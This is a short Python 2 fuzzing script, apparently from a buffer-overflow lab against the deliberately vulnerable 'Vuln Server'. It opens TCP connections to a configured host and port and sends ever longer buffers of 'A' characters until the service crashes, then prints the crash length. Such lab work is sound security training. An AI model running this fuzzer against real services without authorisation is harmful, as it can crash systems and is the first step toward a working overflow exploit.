# Fuzzer.py

#!/usr/bin/python
import sys, socket
from time import sleep
from PARAMETERS import RHOST, RPORT, pre_buffer_name

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((RHOST, RPORT))
		
		#For Vuln Server (('TRUN /.:/'' + buffer))
		s.send((pre_buffer_name + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()
